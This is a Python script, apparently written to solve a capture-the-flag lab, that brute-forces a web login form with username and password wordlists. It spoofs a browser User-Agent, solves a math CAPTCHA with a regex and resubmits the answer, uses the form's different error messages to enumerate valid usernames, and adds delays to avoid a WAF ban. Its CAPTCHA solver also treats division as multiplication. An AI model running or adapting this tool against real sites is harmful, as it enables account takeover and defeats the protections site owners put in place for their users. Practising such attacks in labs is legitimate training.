import requests
import re
import time

url = "http://<MACHINE-IP>/login"
user_file = "usernames.txt"
pass_file = "passwords.txt"

def start():
    session = requests.Session()
    # Mask your identity as a real browser
    session.headers.update({"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0"})

    usernames = open(user_file).read().splitlines()
    passwords = open(pass_file).read().splitlines()

    for user in usernames:
        for password in passwords:
            # 1. Initial Attempt (No CAPTCHA yet)
            data = {"username": user, "password": password}
            res = session.post(url, data=data)

            # 2. Check if we triggered a CAPTCHA
            if "captcha" in res.text.lower():
                # REGEX: Now we look for the math problem because we KNOW it's there
                match = re.search(r"(\d+)\s*([\+\-\*\/])\s*(\d+)", res.text)
                if match:
                    n1, op, n2 = int(match.group(1)), match.group(2), int(match.group(3))
                    ans = n1 + n2 if op == '+' else n1 - n2 if op == '-' else n1 * n2
                    
                    # 3. Resubmit with the solution
                    data["captcha"] = str(ans)
                    res = session.post(url, data=data)

            # 4. Final Logic Check
            if "does not exist" in res.text:
                print(f"[-] User '{user}' invalid. Skipping...")
                break # Next username
            elif "Invalid password" in res.text:
                print(f"    [!] {user}:{password} -> Wrong Password")
            elif res.status_code == 302 or "flag" in res.text.lower():
                print(f"\n[+] SUCCESS: {user}:{password}")
                print(f"Flag: {res.text}")
                return

            time.sleep(0.5) # Avoid WAF ban

if __name__ == "__main__":
    start()
    
